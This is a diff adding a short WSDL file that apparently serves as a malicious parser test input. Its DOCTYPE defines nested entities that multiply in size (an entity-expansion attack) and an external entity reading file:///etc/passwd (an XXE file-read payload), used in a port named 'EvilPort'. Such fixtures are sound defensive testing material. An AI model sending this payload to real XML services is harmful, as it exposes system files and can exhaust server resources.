@@ -1,0 +1,13 @@
+<?xml version="1.0"?>
+<!DOCTYPE definitions [
+  <!ENTITY a "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa">
+  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
+  <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
+  <!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">
+  <!ENTITY leak SYSTEM "file:///etc/passwd">
+]>
+<definitions name="&d;" xmlns="http://schemas.xmlsoap.org/wsdl/">
+  <portType name="EvilPort">
+    <operation name="&leak;"/>
+  </portType>
+</definitions>
